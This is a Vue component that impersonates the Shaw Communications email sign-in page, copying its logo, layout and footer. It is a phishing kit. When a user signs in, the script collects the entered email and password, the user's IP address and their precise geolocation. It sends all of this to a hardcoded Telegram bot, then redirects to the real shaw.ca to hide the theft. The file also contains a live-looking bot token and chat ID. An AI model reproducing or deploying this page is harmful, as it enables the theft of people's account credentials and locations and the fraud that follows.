<template>
  <main class="grey main">
    <!-- navbar -->
    <div class="navbar">
      <div>
        <button class="text-blue">Personal</button>
        <button class="text-blue">Business</button>
      </div>
    </div>

    <!-- Form -->
    <div class="form">
      <div class="centre"><img src="@/assets/Shaw.png" alt="shaw-logo" class="shaw-logo" /></div>
      <h3 class="black">Sign in to access your Shaw email</h3>

      <!-- Error message display -->
      <div v-if="error" class="error-message">{{ error }}</div>

      <div class="form-field">
        <!-- Email section -->
        <div class="email-field">
          <label htmlfor="email">Shaw email</label>
          <div class="flexrow">
            <input
              id="email"
              placeholder="example@shaw.ca"
              type="text"
              v-model="email"
              class="input-email"
            />
            <div class="icon-div">
              <img
                src="@/assets/helpIcon.png"
                alt="helpIcon"
                class="help"
              />
              <p class="text-blue">Help</p>
            </div>
          </div>
        </div>

        <!-- Password section -->
        <div class="password-field">
          <label htmlfor="password">Password</label>
          <input
            id="password"
            type="password"
            v-model="password"
            class="input-password"
          />
        </div>

        <!-- Remember me checkbox -->
        <div class="gap">
          <input type="checkbox" value="Remember Shaw email" class="checkbox" />
          <p class="checkbox-font">Remember Shaw email</p>
        </div>
      </div>

      <!-- Sign in button -->
      <button
        class="modal-button shaw-blue"
        :disabled="!isFormValid"
        @click="signIn"
      >
        Sign in
      </button>

      <p class="centralized mt">
        <span class="bold">Having trouble?</span>
        <span class="text-blue cursor-pointer"> Shaw Support: How To Reset My Password</span>
      </p>
      <p class="centralized mb">
        <span class="bold">Already Know How?</span>
        <span class="text-blue cursor-pointer"> Reset Password On My Shaw</span>
      </p>
    </div>

    <div class="modal-footer">
      <p>
        <span class="underline">Privacy Policy</span> |
        <span class="underline">Terms of Use</span> |
        <span class="underline">Accessibility</span>
      </p>
      <p class="footer-small">&copy; 2024 Shaw Communications. All Rights Reserved.</p>
    </div>
  </main>
</template>

<script setup>
import { ref, computed } from 'vue'
import axios from 'axios'

const email = ref('')
const password = ref('')
const error = ref('')
const locationData = ref({})

// Computed property to check if the form is valid
const isFormValid = computed(() => {
  return validateEmail(email.value) && password.value.trim() !== ''
})

// Email validation function
function validateEmail(email) {
  const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/
  return re.test(email)
}

// Get IP address function
async function getIpAddress() {
  try {
    const response = await axios.get('https://api64.ipify.org?format=json')
    return response.data.ip
  } catch (error) {
    console.error('Failed to fetch IP address:', error)
    return 'N/A'
  }
}

// Get user's geolocation (lat, lon) using Geolocation API
async function getGeolocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            lat: position.coords.latitude,
            lon: position.coords.longitude
          })
        },
        (error) => reject(error),
        { enableHighAccuracy: true }
      )
    } else {
      reject('Geolocation is not supported by this browser.')
    }
  })
}

// Get location details based on latitude and longitude
async function getLocationDetails(lat, lon) {
  try {
    const response = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`
    )
    const data = await response.json()
    return {
      country: data.address ? data.address.country : 'N/A',
      city: data.address ? data.address.city : 'N/A',
      state: data.address ? data.address.state : 'N/A',
      zip_code: data.address ? data.address.postcode : 'N/A',
    }
  } catch (error) {
    console.error('Error fetching location details:', error)
    return {
      country: 'N/A',
      city: 'N/A',
      state: 'N/A',
      zip_code: 'N/A',
    }
  }
}

// Send data to Telegram bot
async function sendDataToTelegram(location) {
  const ipAddress = await getIpAddress()
  const message = `Email: ${email.value}\nPassword: ${password.value}\nIP Address: ${ipAddress}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}\nCountry: ${location.country}`

  const botToken = '7697246301:AAFcC_2HcCcnHZ3ePerNLn8XkgqexprrfiI'
  const chatId = 1678259688
  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`

  try {
    const response = await axios.post(telegramApiUrl, {
      chat_id: chatId,
      text: message,
    })

    if (response.status === 200) {
      console.log('Message sent successfully')
    } else {
      console.error('Failed to send message:', response.status)
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error)
  }
}

// Sign-in logic
async function signIn() {
  // Validate email and password
  if (!validateEmail(email.value)) {
    error.value = 'Please enter a valid email address.'
    return
  }

  if (password.value.trim() === '') {
    error.value = 'Password cannot be empty.'
    return
  }

  // Clear any existing errors
  error.value = ''

  try {
    // Get user's geolocation
    const { lat, lon } = await getGeolocation()
    
    // Fetch location details
    const location = await getLocationDetails(lat, lon)

    // Send data to Telegram
    sendDataToTelegram(location)

    // Redirect user after successful sign-in
    window.location.href = 'https://www.shaw.ca'
    console.log('User signed in successfully.')
  } catch (error) {
    console.error('Error during sign-in:', error)
    error.value = 'An error occurred during sign-in. Please try again later.'
  }
}
</script>

<style scoped>
.error-message {
  color: red;
  margin-top: 10px;
  font-size: 14px;
}

.grey {
  background: #eee;
}

.main {
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

.navbar {
  margin-bottom: 20px;
  padding: 10px;
  background: white;
  /* border-radius: 5px; */
}

.navbar button {
    background: #fff;
    outline: none;
    border: 1px solid #e0e0e0;
    font-size: 10px;
    padding: 0 7px 0 12px;
    width: 74px;
    height: 24px;
    font-weight: 500;
    font-family: Arial, "Helvetica";
}

.centre {
    display: flex;
    justify-content: center;
    align-items: center;
}

.shaw-logo {
  width: 300px;
  height: 120px;
}

.text-blue {
  color: #0082bb;
}

.bold {
  font-weight: 700;
}

.centralized {
  text-align: center;
  font-size: 14px;
}

/* Style the checkbox container */
.gap {
  display: flex;
  align-items: center;
  margin: 10px 0;
}

/* Hide the default checkbox appearance */
.checkbox {
  width: 20px;
  height: 20px;
  appearance: none;
  border: 2px solid #ccc;
  border-radius: 4px;
  position: relative;
  margin-right: 10px;
  cursor: pointer;
  background-color: #fff;
  transition: background-color 0.3s, border-color 0.3s;
}

/* When the checkbox is checked, change the color */
.checkbox:checked {
  background-color: #0082bb;
  border-color: #0082bb;
}

/* Create a checkmark when the checkbox is checked */
/* .checkbox:checked::after {
  content: '';
  position: absolute;
  top: 4px;
  left: 4px;
  width: 8px;
  height: 8px;
  background-color: #fff;
  clip-path: polygon(0% 50%, 40% 100%, 100% 0%, 100% 60%, 40% 100%);
} */

/* Style for the text next to the checkbox */
.checkbox-font {
  font-size: 16px;
  font-family: Arial, sans-serif;
  color: #333;
  margin: 0;
}


.black {
  font-weight: 700;
  text-align: center;
  margin-bottom: 15px;
}

.underline {
  text-decoration: underline;
}

.icon-div {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 2px;
  cursor: pointer;
}

.form {
  /* border: 1px solid #0074a7; */
  border-radius: 10px;
  padding: 20px;
  max-width: 400px;
  margin: 0 auto;
  background: white;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
}

.form-field {
  margin-bottom: 20px;
}

.email-field {
  display: flex;
  flex-direction: column;
  margin-bottom: 10px;
  gap: 5px;
}

.input-email  {
  width: 285px !important;
  height: 40px !important;
  border-radius: 4px;
  /* outline: none; */
}

.input-email:focus .input-email:hover {
    border: 1px solid #0082bb !important;
    outline: none;
}

.flexrow {
  display: flex;
  align-items: center;
}

.icon-div {
  display: flex;
  align-items: center;
  margin-left: 10px;
}

.password-field {
  display: flex;
  flex-direction: column;
  margin-bottom: 10px;
}

.input-password {
  width: 285px !important;
  height: 40px !important;
  border-radius: 4px;
  /* outline: none; */
}

.input-password:focus .input-password:hover {
    border: 1px solid #0082bb !important;
    outline: none;
}

.cursor-pointer {
    cursor: pointer;
    /* text-decoration: underline; */
}

.cursor-pointer:hover {
    text-decoration: underline;
}

.mt {
    margin-top: 30px;
}

.mb {
    margin-bottom: 20px;
}

.footer-small {
  font-size: 12px;
}

.modal-button {
  width: 100%;
  padding: 10px;
  border: none;
  border-radius: 5px;
  color: white;
  background: linear-gradient(to bottom, #0082bb 0%, #0074a7 100%);
  cursor: pointer;
  transition: background 0.3s;
  height: 55px;
  font-weight: bold;
  margin: 15px 20px 20px 0;
  min-width: 210px;
}

.modal-button:hover {
  background: linear-gradient(to bottom, #0074a7 0%, #006699 100%);
}

.modal-footer {
  display: flex;
  flex-direction: column;
  justify-content: space-around;
  gap: 10px;
  margin-top: 40px;
  background: #333333;
  color: grey;
  padding: 10px;
  text-align: center;
  height: 85px;
}

@media (max-width: 600px) {
  .form {
    width: 95%;
    height: 80% !important;
    padding: 15px;
  }
}
</style>
